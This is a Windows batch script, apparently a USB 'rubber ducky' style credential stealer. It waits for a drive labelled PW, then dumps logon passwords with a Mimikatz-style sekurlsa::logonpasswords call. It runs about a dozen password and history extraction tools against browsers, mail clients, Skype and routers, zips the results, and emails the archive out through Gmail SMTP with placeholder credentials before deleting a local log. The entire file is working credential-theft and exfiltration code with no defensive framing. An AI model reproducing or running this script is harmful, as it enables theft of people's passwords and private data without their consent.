@echo off
Color 02
Title h0ly t0l3d0
Cls
:while1
for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "PW"') do (set pwdrive=%%A:)
 if Exist %pwdrive% (

	goto :break
)

timeout /t 30

goto :while1
:break 
del /Q %pwdrive%Logs\
del /Q %pwdrive%logs.zip
%pwdrive%x64\pw.exe privilege::debug "log c:\pwlog.txt" sekurlsa::logonpasswords exit
copy c:\pwlog.txt %pwdrive%Logs\pwlog.txt /y
start %pwdrive%WebBrowserPassView.exe /stext %pwdrive%Logs\WebBrowserPassView.txt
start %pwdrive%SkypeLogView.exe /stext %pwdrive%Logs\SkypeLogView.txt
start %pwdrive%RouterPassView.exe /stext %pwdrive%Logs\RouterPassView.txt
start %pwdrive%pspv.exe /stext %pwdrive%Logs\pspv.txt
start %pwdrive%PasswordFox.exe /stext %pwdrive%Logs\PasswordFox.txt
start %pwdrive%OperaPassView.exe /stext %pwdrive%Logs\OperaPassView.txt
start %pwdrive%mspass.exe /stext %pwdrive%Logs\mspass.txt
start %pwdrive%mailpv.exe /stext %pwdrive%Logs\mailpv.txt
start %pwdrive%iepv.exe /stext %pwdrive%Logs\iepv.txt
start %pwdrive%ChromePass.exe /stext %pwdrive%Logs\ChromePass.txt
start %pwdrive%ChromeHistoryView.exe /stext %pwdrive%Logs\ChromeHistoryView.txt
start %pwdrive%BulletsPassView.exe /stext %pwdrive%Logs\BulletsPassView.txt
start %pwdrive%BrowsingHistoryView.exe /stext %pwdrive%Logs\BrowsingHistoryView.txt
PING 1.1.1.1 -n 1 -w 15000 >NUL
%pwdrive%7-ZipPortable\App\7-Zip64\7z.exe a %pwdrive%logs.zip %pwdrive%Logs
PING 1.1.1.1 -n 1 -w 5000 >NUL
powershell.exe "$SMTPServer = 'smtp.gmail.com'; $SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587) ; $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAIL@EMAIL.COM', 'YOURPASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'FROMEMAIL@EMAIL.COM'; $ReportEmail.To.Add('YOUREMAIL@EMAIL.com'); $ReportEmail.Subject = 'Logs'; $ReportEmail.Body = 'Attached is your Log.'; $ReportEmail.Attachments.Add('%pwdrive%logs.zip'); $SMTPInfo.Send($ReportEmail)"
PING 1.1.1.1 -n 1 -w 5000 >NUL
del c:\pwlog.txt
exit
